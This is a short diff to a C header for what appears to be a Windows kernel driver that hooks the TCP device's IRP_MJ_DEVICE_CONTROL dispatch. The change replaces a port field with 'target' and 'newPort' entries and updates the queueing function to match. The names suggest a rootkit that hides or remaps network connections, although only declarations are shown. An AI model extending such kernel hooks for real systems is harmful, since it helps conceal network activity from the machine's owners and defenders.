@@ -60,7 +60,8 @@ PDRIVER_DISPATCH glRealIrpMjDeviceControl;
 typedef struct _TASK_QUEUE_NET {
 
 	BOOLEAN isSrc;
-	ULONG port;
+	ULONG target;
+	ULONG newPort;
 	LIST_ENTRY link;
 
 } TASK_QUEUE_NET, *PTASK_QUEUE_NET;
@@ -73,7 +74,7 @@ NTSTATUS InstallTCPDriverHook(WCHAR* wcTcpDeviceNameBuffer);
 NTSTATUS HookTcpDeviceControl(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);
 NTSTATUS CompletionRoutine(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp, IN PCompletionRoutineContext pContext);
 
-VOID TaskQueueByNet(ULONG port, BOOLEAN isSrc);
+VOID TaskQueueByNet(ULONG target, ULONG newPort, BOOLEAN isSrc);
 VOID FreeListQueueNet();
 VOID PrintTaskQueueNetList();
 
